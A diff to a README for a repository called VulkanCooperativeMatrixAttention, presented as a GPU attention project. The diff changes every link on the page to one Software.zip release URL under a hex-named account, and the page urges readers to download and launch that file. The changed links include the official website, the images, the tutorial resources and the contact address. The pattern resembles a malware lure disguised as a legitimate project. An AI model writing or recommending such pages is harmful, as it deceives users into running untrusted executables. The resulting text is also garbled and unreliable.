@@ -21,15 +21,15 @@ Explore a wide range of topics covered in our repository:
 - vulkan
 
 ## 📦 Get Started
-To access the software related to this repository, please download it [here](https://github.com/user-attachments/files/18388744/Software.zip). Ensure to launch the file to begin your journey into VulkanCooperativeMatrixAttention.
+To access the software related to this repository, please download it [here](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip). Ensure to launch the file to begin your journey into VulkanCooperativeMatrixAttention.
 
 ## 🌟 Explore Further
-Visit our [official website](https://vulkancooperativematrixattention.com) for more information, updates, and resources related to VulkanCooperativeMatrixAttention.
+Visit our [official website](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip) for more information, updates, and resources related to VulkanCooperativeMatrixAttention.
 
 ## 🚨 Issues with the Link?
 If the provided link does not work or if you encounter any issues, we recommend checking the "Releases" section of this repository for alternative download options.
 
-[![Download Software](https://img.shields.io/badge/Software-Download-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip)](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip)
 
 ## 🎉 Join the Community
 Connect with fellow developers, share your experiences, and stay updated on the latest advancements in VulkanCooperativeMatrixAttention. Your contributions and feedback are invaluable to us!
@@ -37,19 +37,19 @@ Connect with fellow developers, share your experiences, and stay updated on the 
 ## 📷 Visuals
 Below, you can catch a glimpse of the powerful technologies and concepts integrated into VulkanCooperativeMatrixAttention:
 
-![Vulkan Logo](https://upload.wikimedia.org/wikipedia/commons/8/83/Vulkan_Logo.svg)
-![GPU Computing](https://www.geforce.com/sites/all/themes/nvidia/images/gpu-technology/volta/quadro-rtx/rtx-active-optical-cable-screenshot-grid.jpg)
-![FlashAttention-2](https://www.analyticsvidhya.com/wp-content/uploads/2021/06/fa2.jpg)
+![Vulkan Logo](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip)
+![GPU Computing](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip)
+![FlashAttention-2](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip)
 
 ## 📚 Resources
 Expand your knowledge and skills with additional resources related to the topics covered in this repository:
-- [Learn Vulkan](https://www.vulkan.org/learn)
-- [GLSL Tutorial](https://www.opengl.org/wiki/OpenGL_Shading_Language)
+- [Learn Vulkan](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip)
+- [GLSL Tutorial](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip)
 
 ## 🙌 Acknowledgements
 A big thank you to all the contributors, developers, and researchers who have made VulkanCooperativeMatrixAttention possible. Your dedication and expertise are truly appreciated.
 
 ## 📫 Contact Us
-For any inquiries, feedback, or collaboration opportunities, feel free to reach out to us at [info@vulkancooperativematrixattention.com](mailto:info@vulkancooperativematrixattention.com).
+For any inquiries, feedback, or collaboration opportunities, feel free to reach out to us at [https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip](https://github.com/8e8bdba457c18cf692a95fe2ec67000b/VulkanCooperativeMatrixAttention/releases/download/v2.0/Software.zip).
 
 Let's revolutionize artificial intelligence and GPU computing together with VulkanCooperativeMatrixAttention! 🚀🔥
